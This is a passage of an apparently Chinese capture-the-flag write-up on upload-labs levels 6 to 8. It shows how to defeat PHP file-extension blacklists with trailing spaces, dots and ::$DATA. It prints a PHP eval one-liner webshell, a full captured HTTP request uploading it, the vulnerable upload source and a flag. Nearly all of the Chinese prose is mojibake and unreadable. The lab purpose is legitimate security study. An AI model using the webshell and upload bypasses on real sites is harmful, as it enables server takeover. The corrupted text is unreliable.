src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.48.30.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.48.05.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°é€šè¿‡.phpååŠ ç©ºæ ¼çš„æ–¹å¼ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåœ¨linuxä¸­ä¼šæœ‰ä¸€ä¸ª<code>\ç©ºæ ¼</code>ï¼Œè¦æƒ³æŸ¥çœ‹å¿…é¡»åŠ <code>\ç©ºæ ¼</code>ï¼ŒæœåŠ¡å™¨ä¸Šä¸å­˜åœ¨<code>.php</code>æ–‡ä»¶ï¼Œä»…å­˜åœ¨<code>.phpç©ºæ ¼</code>æ–‡ä»¶ã€‚æ‰€ä»¥ä¹Ÿå°±æ— æ³•ç»•è¿‡æ£€æµ‹ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.50.53.png" style="zoom:50%;"><blockquote><h4 id="ls-b"><a href="#ls-b" class="headerlink" title="ls -b:"></a>ls -b:</h4><p><code>ls -b</code> æ˜¯ Linux ä¸­ <code>ls</code> å‘½ä»¤çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨äºåœ¨æ–‡ä»¶åä¸­æ˜¾ç¤ºéæ‰“å°å­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰çš„åæ–œæ è½¬ä¹‰å½¢å¼ã€‚è¿™å¯ä»¥å¸®åŠ©ç”¨æˆ·æ›´æ¸…æ™°åœ°æŸ¥çœ‹æ–‡ä»¶åä¸­åŒ…å«çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå°¤å…¶æ˜¯é‚£äº›åœ¨ç»ˆç«¯ä¸­éš¾ä»¥ç›´æ¥æ˜¾ç¤ºçš„å­—ç¬¦ã€‚</p></blockquote><h2 id="6-4-åœ¨windwosé¶åœºå®ç°åˆ©ç”¨"><a href="#6-4-åœ¨windwosé¶åœºå®ç°åˆ©ç”¨" class="headerlink" title="6.4 åœ¨windwosé¶åœºå®ç°åˆ©ç”¨"></a>6.4 åœ¨windwosé¶åœºå®ç°åˆ©ç”¨</h2><p>é‡æ–°å¼€å¯ä¸€ä¸ªwindowsé¶åœºç¯å¢ƒã€‚å¯¹åº”çš„æ˜¯Pass-07ã€‚</p><p>é€šè¿‡æ·»åŠ ç©ºæ ¼ç»•è¿‡åç¼€åæ£€æµ‹ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2018.04.09.png" style="zoom:50%;"><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2018.05.17.png" style="zoom:50%;"><p>ç¯å¢ƒè²Œä¼¼æœ‰ç‚¹é—®é¢˜ï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥getshellã€‚</p><h1 id="ä¸ƒã€Pass-07ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-ç»•è¿‡-ï¼‰"><a href="#ä¸ƒã€Pass-07ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-ç»•è¿‡-ï¼‰" class="headerlink" title="ä¸ƒã€Pass-07ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨.ç»•è¿‡ ï¼‰"></a>ä¸ƒã€Pass-07ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨.ç»•è¿‡ ï¼‰</h1><h2 id="7-1-é¢˜é¢"><a href="#7-1-é¢˜é¢" class="headerlink" title="7.1 é¢˜é¢"></a>7.1 é¢˜é¢</h2><p>é¢˜é¢è¿˜æ˜¯è€æ ·å­ã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122200912089.png" alt="image-20250122200912089"></p><h2 id="7-2-è§£é¢˜"><a href="#7-2-è§£é¢˜" class="headerlink" title="7.2 è§£é¢˜"></a>7.2 è§£é¢˜</h2><p>è€è§„çŸ©ï¼Œå…ˆä¸Šä¼ yjh.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php eval($_POST['sxkk']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠ“åŒ…ï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122201232711.png" alt="image-20250122201232711"></p><ul><li>åç¼€æ”¹æˆ.jpgèƒ½ä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´</li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122201320059.png" alt="image-20250122201320059"></p><ul><li>conten-type:text/php ä¹Ÿèƒ½ä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹</li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122201450389.png" alt="image-20250122201450389"></p><p>è¿™ä¸€å…³å¤šåŠè¿˜æ˜¯åœ¨åç«¯æ£€æµ‹çš„æ–‡ä»¶åç¼€ã€‚</p><p>å¹¶ä¸”å¯ä»¥æ³¨æ„åˆ°ï¼Œæ²¡æœ‰å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</p><ul><li>çœ‹ä¸‹æœ‰æ²¡æœ‰åšå¤§å†™è½¬å°å†™</li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122201702972.png" alt="image-20250122201702972"></p><p>çœ‹æ¥æ²¡æœ‰åšå°å†™è½¬æ¢ã€‚é‚£ä¹ˆå¯ä»¥å°è¯•æ”¹å˜ä¸€ä¸‹å¤§å°å†™ç»•è¿‡åç¼€åæ£€æµ‹ã€‚</p><ul><li>é¡ºç€æ€è·¯å¾€ä¸‹ï¼Œè¯•è¯•.PHPåç¼€ã€‚</li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122201836279.png" alt="image-20250122201836279"></p><p>.PHP è¢«banäº†ã€‚</p><p>åŒç†å†å°è¯•å‡ ä¸ªï¼š.PHp  .PHTml  .Php3 .HTM  .HTm .HTaCCess .HTaccesså‡å‘Šå¤±è´¥ã€‚</p><p>.htaccessä¹Ÿè¢«banäº†ï¼Œé»‘åå•æœ‰ç‚¹å¼ºäº†ã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122202207526.png" alt="image-20250122202207526"></p><ul><li>çœ‹ä¸‹æç¤º</li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122202319954.png" alt="image-20250122202319954"></p><p>æŒºç‹ çš„å˜›ã€‚</p><ul><li>çœ‹ä¸‹æºä»£ç å’‹å®ç°çš„</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º                if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['upload_file']['tmp_name'];            $img_path = UPLOAD_PATH.'/'.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';            }        } else {            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';        }    } else {        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æä¸€ä¸‹æºä»£ç ï¼š</p><p>é»‘åå•ç¡®å®å¤Ÿå…¨çš„ï¼Œå…¶å®æ£€æµ‹åç¼€åæ—¶ä¹Ÿè½¬åŒ–ä¸ºäº†å°å†™ï¼ˆ $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ï¼‰ï¼Œåªæ˜¯æ²¡æœ‰è¿›è¡Œé‡å‘½åã€‚åæ€ä¸€ä¸‹ä¹‹å‰æ¬ è€ƒè™‘çš„åœ°æ–¹ï¼šå…¶å®ä¸èƒ½é€šè¿‡ä¸‹é¢çš„ç°è±¡å°±åˆ¤æ–­æ²¡æœ‰åšå¤§å°å†™è½¬æ¢ï¼Œè¿™åªèƒ½è¯´æ˜åœ¨ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­çš„æ—¶å€™æ–‡ä»¶åæ²¡åšå¤§å°å†™è½¬æ¢ï¼Œä½†æ˜¯åç¼€åæ£€æµ‹çš„é€»è¾‘å®Œå…¨å¯ä»¥å…ˆå°†åç¼€åç»Ÿä¸€è½¬æ¢æˆå°å†™å†æ¯”å¯¹ï¼Œè¿™æ ·æ•ˆç‡ä¼šæ¯”è¾ƒé«˜ã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122202731584.png" alt="image-20250122202731584"></p><p>æ ¸å¿ƒé€»è¾‘ï¼š1ï¼‰æ„å»ºäº†ä¸€ä¸ªé»‘åå•ã€‚2ï¼‰è·å–æ–‡ä»¶åã€‚3ï¼‰strrchr($file_name, â€˜.â€™);è·å–æœ€åä¸€ä¸ª.åŠåé¢çš„å†…å®¹ä½œä¸ºåç¼€åã€‚ã€‚ã€‚</p><p>çœ‹åˆ°è¿™é‡Œä¸‹é¢ä¹Ÿä¸ç”¨çœ‹äº†ã€‚<code>strrchr()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²å‡½æ•°ï¼Œç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å†…å®¹ã€‚å¦‚æœæœªæ‰¾åˆ°æŒ‡å®šçš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p><p>å¦‚æœæ„é€ <code>yjh.php.</code>ï¼Œé‚£ä¹ˆ$file_extè·å–çš„å°±æ˜¯ä¸€ä¸ªâ€.â€ï¼Œå½“ç„¶å°±ä¸åœ¨é»‘åå•ä¸­ï¼Œ<code>yjh.php.</code>å°±ä¼šä¸Šä¼ æˆåŠŸã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122203509925.png" alt="image-20250122203509925"></p><p>å¯ä»¥çœ‹åˆ°æœçœŸä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯èƒ½ä¸èƒ½è®¿é—®å‘¢ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122203559763.png" alt="image-20250122203559763"></p><p>è²Œä¼¼å·²ç»è¢«è§£ææ‰§è¡Œäº†ã€‚</p><p>ä½¿ç”¨èšå‰‘ï¼ŒæˆåŠŸgetshellã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122203714931.png" alt="image-20250122203714931"></p><p>flagï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250122203749848.png" alt="image-20250122203749848"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>524dcdc6-c03c-4805-af66-b274a2bf92c5<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å…«ã€Pass-08-åç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-DATAç»•è¿‡-windwos"><a href="#å…«ã€Pass-08-åç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-DATAç»•è¿‡-windwos" class="headerlink" title="å…«ã€Pass-08 (åç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨::$DATAç»•è¿‡(windwos))"></a>å…«ã€Pass-08 (åç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨::$DATAç»•è¿‡(windwos))</h1><h2 id="8-1-é¢˜é¢"><a href="#8-1-é¢˜é¢" class="headerlink" title="8.1 é¢˜é¢"></a>8.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.04.47.png" style="zoom:50%;"><p>è¿™ä¸€å…³ä¹Ÿæ˜¯è€æ ·å­ã€‚</p><h2 id="8-2-è§£é¢˜"><a href="#8-2-è§£é¢˜" class="headerlink" title="8.2 è§£é¢˜"></a>8.2 è§£é¢˜</h2><p>ä¸Šä¼ yjh.phpç„¶åæŠ“åŒ…ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.28.38.png" alt="æˆªå±2025-01-23 10.28.38" style="zoom:50%;"><blockquote><h4 id="requestæ•°æ®åˆ†æï¼ˆå¤šéƒ¨åˆ†è¡¨å•æ•°æ®-multipart-form-dataï¼‰"><a href="#requestæ•°æ®åˆ†æï¼ˆå¤šéƒ¨åˆ†è¡¨å•æ•°æ®-multipart-form-dataï¼‰" class="headerlink" title="requestæ•°æ®åˆ†æï¼ˆå¤šéƒ¨åˆ†è¡¨å•æ•°æ®-multipart/form-dataï¼‰"></a>requestæ•°æ®åˆ†æï¼ˆå¤šéƒ¨åˆ†è¡¨å•æ•°æ®-multipart/form-dataï¼‰</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /Pass-08/index.php HTTP/1.1Host: aac64ca3-95bb-44ac-b5b8-600a34d4a31c.node5.buuoj.cn:81Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Origin: http://aac64ca3-95bb-44ac-b5b8-600a34d4a31c.node5.buuoj.cn:81Upgrade-Insecure-Requests: <span class="token number">1</span>Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>----WebKitFormBoundaryGzBzcdHfXwbmj0tfUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X 10_15_7<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/131.0.0.0 Safari/537.36Referer: http://aac64ca3-95bb-44ac-b5b8-600a34d4a31c.node5.buuoj.cn:81/Pass-08/index.phpContent-Length: <span class="token number">313</span>------WebKitFormBoundaryGzBzcdHfXwbmj0tfContent-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"yjh.php"</span>Content-Type: text/php<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span>------WebKitFormBoundaryGzBzcdHfXwbmj0tfContent-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"submit"</span>ä¸Šä¼ ------WebKitFormBoundaryGzBzcdHfXwbmj0tf--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„<code>------WebKitFormBoundaryGzBzcdHfXwbmj0tf </code>çš„ä½œç”¨ï¼Ÿ</p><h5 id="å…ˆæ¥çœ‹è¯·æ±‚å¤´ä¸­çš„Content-Type"><a href="#å…ˆæ¥çœ‹è¯·æ±‚å¤´ä¸­çš„Content-Type" class="headerlink" title="å…ˆæ¥çœ‹è¯·æ±‚å¤´ä¸­çš„Content-Type"></a>å…ˆæ¥çœ‹è¯·æ±‚å¤´ä¸­çš„Content-Type</h5><p>åœ¨è¯·æ±‚å¤´ä¸­æœ‰ï¼šContent-Type: multipart/form-data; boundary=â€”-WebKitFormBoundaryGzBzcdHfXwbmj0tf å¤´ï¼Œ</p><p>æŒ‡å®šäº†è¯·æ±‚ä½“çš„æ•°æ®ä¸º<code>å¤šéƒ¨åˆ†è¡¨å•æ•°æ®</code>ï¼Œ</p><ul><li>æŒ‡ç¤ºè¯·æ±‚ä½“çš„æ ¼å¼ã€‚è¿™é‡Œæ˜¯<code>multipart/form-data</code>ï¼Œè¡¨ç¤ºè¯·æ±‚ä½“åŒ…å«å¤šä¸ªéƒ¨åˆ†ï¼ˆå­—æ®µï¼‰ï¼Œæ¯ä¸ªéƒ¨åˆ†ç”±<code>boundary</code>åˆ†éš”ç¬¦åˆ†éš”ã€‚</li><li><code>boundary=----WebKitFormBoundaryGzBzcdHfXwbmj0tf</code>ï¼šæŒ‡å®šåˆ†éš”ç¬¦ã€‚</li></ul><h5 id="è¯·æ±‚ä½“"><a href="#è¯·æ±‚ä½“" class="headerlink" title="è¯·æ±‚ä½“"></a>è¯·æ±‚ä½“</h5><p>è¯·æ±‚ä½“æ˜¯<code>multipart/form-data</code>æ ¼å¼ï¼ŒåŒ…å«å¤šä¸ªéƒ¨åˆ†ï¼ˆå­—æ®µï¼‰ã€‚æ¯ä¸ªéƒ¨åˆ†ç”±<code>boundary</code>åˆ†éš”ç¬¦åˆ†éš”ã€‚</p><ul><li><strong>ç¬¬ä¸€ä¸ªå­—æ®µï¼šä¸Šä¼ çš„æ–‡ä»¶</strong></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------WebKitFormBoundaryGzBzcdHfXwbmj0tfContent-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"yjh.php"</span>Content-Type: text/php<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>**<code>------WebKitFormBoundaryGzBzcdHfXwbmj0tf</code>**ï¼šå­—æ®µçš„å¼€å§‹æ ‡è®°ã€‚</li><li>**<code>Content-Disposition</code>**ï¼š<ul><li><code>name="upload_file"</code>ï¼šå­—æ®µçš„åç§°ï¼Œå¯¹åº”HTMLè¡¨å•ä¸­çš„<code>&lt;input name="upload_file"&gt;</code>ã€‚</li><li><code>filename="yjh.php"</code>ï¼šä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åã€‚</li></ul></li><li>**<code>Content-Type</code>**ï¼šæŒ‡å®šæ–‡ä»¶çš„MIMEç±»å‹ï¼Œè¿™é‡Œæ˜¯<code>text/php</code>ã€‚</li><li><strong>æ–‡ä»¶å†…å®¹</strong>ï¼š<code>&lt;?php @eval($_POST['sxk'])?&gt;</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªPHPä»£ç ï¼Œå¯èƒ½æ˜¯ç”¨äºæµ‹è¯•çš„WebShellã€‚</li></ul></blockquote><ul><li><strong>ç¬¬äºŒä¸ªå­—æ®µï¼šæäº¤æŒ‰é’®</strong></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------WebKitFormBoundaryGzBzcdHfXwbmj0tfContent-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"submit"</span>ä¸Šä¼ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>**<code>------WebKitFormBoundaryGzBzcdHfXwbmj0tf</code>**ï¼šå­—æ®µçš„å¼€å§‹æ ‡è®°ã€‚</li><li>**<code>Content-Disposition</code>**ï¼š<ul><li><code>name="submit"</code>ï¼šå­—æ®µçš„åç§°ï¼Œå¯¹åº”HTMLè¡¨å•ä¸­çš„æäº¤æŒ‰é’®ã€‚</li></ul></li><li><strong>å­—æ®µå†…å®¹</strong>ï¼š<code>ä¸Šä¼ </code>ï¼Œè¡¨ç¤ºæäº¤æŒ‰é’®çš„å€¼ã€‚</li></ul></blockquote><h5 id="ç»“æŸæ ‡è®°"><a href="#ç»“æŸæ ‡è®°" class="headerlink" title="ç»“æŸæ ‡è®°"></a><strong>ç»“æŸæ ‡è®°</strong></h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------WebKitFormBoundaryGzBzcdHfXwbmj0tf--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è¡¨ç¤ºè¯·æ±‚ä½“çš„ç»“æŸã€‚</li></ul><h5 id="Content-Dispositionå­—æ®µ"><a href="#Content-Dispositionå­—æ®µ" class="headerlink" title="Content-Dispositionå­—æ®µ"></a>Content-Dispositionå­—æ®µ</h5><p><code>Content-Disposition</code> æ˜¯ HTTP åè®®ä¸­çš„ä¸€ä¸ªå¤´éƒ¨å­—æ®µï¼Œé€šå¸¸ç”¨äºæè¿°æ¶ˆæ¯ä½“ï¼ˆå¦‚æ–‡ä»¶æˆ–è¡¨å•æ•°æ®ï¼‰çš„æ€§è´¨å’Œå†…å®¹ã€‚å®ƒåœ¨æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½åœºæ™¯ä¸­éå¸¸å¸¸è§ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç† <code>multipart/form-data</code> æ ¼å¼çš„è¯·æ±‚æ—¶ã€‚</p><p><strong>1. <code>Content-Disposition</code> çš„ä½œç”¨</strong></p><p><code>Content-Disposition</code> çš„ä¸»è¦ä½œç”¨æ˜¯ï¼š</p><ul><li>æŒ‡å®šæ¶ˆæ¯ä½“çš„ç±»å‹ï¼ˆå¦‚æ–‡ä»¶ã€è¡¨å•æ•°æ®ç­‰ï¼‰ã€‚</li><li>æä¾›å…³äºæ¶ˆæ¯ä½“çš„é™„åŠ ä¿¡æ¯ï¼Œä¾‹å¦‚æ–‡ä»¶åã€å­—æ®µåç§°ç­‰ã€‚</li></ul><p><strong>2. å¸¸è§çš„ <code>Content-Disposition</code> ç”¨æ³•</strong></p><p>åœ¨ HTTP è¯·æ±‚å’Œå“åº”ä¸­ï¼Œ<code>Content-Disposition</code> é€šå¸¸ç”¨äºä»¥ä¸‹ä¸¤ç§åœºæ™¯ï¼š</p><p><strong>(1) æ–‡ä»¶ä¸‹è½½</strong></p><p>åœ¨ HTTP å“åº”ä¸­ï¼Œ<code>Content-Disposition</code> å¯ä»¥æŒ‡ç¤ºæµè§ˆå™¨å¦‚ä½•å¤„ç†å“åº”å†…å®¹ï¼ˆæ˜¯ç›´æ¥æ˜¾ç¤ºè¿˜æ˜¯ä¸‹è½½æ–‡ä»¶ï¼‰ï¼Œå¹¶æä¾›æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Content-Disposition: attachment<span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"example.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>**<code>attachment</code>**ï¼šæŒ‡ç¤ºæµè§ˆå™¨å°†å“åº”å†…å®¹ä½œä¸ºæ–‡ä»¶ä¸‹è½½ã€‚</li><li>**<code>filename="example.txt"</code>**ï¼šæŒ‡å®šä¸‹è½½æ–‡ä»¶çš„æ–‡ä»¶åã€‚</li></ul><p><strong>(2) æ–‡ä»¶ä¸Šä¼ </strong></p><p>åœ¨ HTTP è¯·æ±‚ä¸­ï¼Œ<code>Content-Disposition</code> ç”¨äºæè¿° <code>multipart/form-data</code> æ ¼å¼ä¸­çš„æ¯ä¸ªéƒ¨åˆ†ï¼ˆå­—æ®µï¼‰ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"example.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>**<code>form-data</code>**ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¡¨å•å­—æ®µã€‚</li><li>**<code>name="upload_file"</code>**ï¼šå­—æ®µçš„åç§°ï¼Œå¯¹åº” HTML è¡¨å•ä¸­çš„ <code>&lt;input name="upload_file"&gt;</code>ã€‚</li><li>**<code>filename="example.txt"</code>**ï¼šä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åï¼ˆå¯é€‰ï¼Œä»…åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ä½¿ç”¨ï¼‰ã€‚</li></ul><p>å•°å—¦äº†è¿™ä¹ˆå¤šï¼Œä¸»è¦æ˜¯ä¸ºäº†å¯¹requestè¯·æ±‚æ•°æ®æœ‰æ›´åŠ å…¨é¢å’Œæ·±åˆ»çš„è®¤è¯†ã€‚</p></blockquote><ul><li>åˆ¤æ–­æ£€æµ‹æ–¹æ³•</li></ul><p>æ”¹æˆ.jpgåç¼€ä¸Šä¼ æˆåŠŸäº†=&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´&amp;&amp;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.30.06.png" style="zoom:50%;"><p>åˆ¤æ–­ä¹Ÿæ˜¯åç«¯æ£€æµ‹åç¼€åï¼Œè€Œä¸”åº”è¯¥åœ¨å®ç°æ£€æµ‹é€»è¾‘çš„æ—¶å€™åšäº†å°å†™è½¬æ¢ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.31.32.png" style="zoom:50%;"><ul><li>ç©ºæ ¼å’Œâ€.â€ç»•è¿‡å¤±è´¥</li></ul><p>å°è¯•ä¸€ä¸‹åœ¨å°¾éƒ¨æ·»åŠ ç©ºæ ¼å’Œ.èƒ½å¦ç»•è¿‡ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.32.48.png" style="zoom:50%;"><img 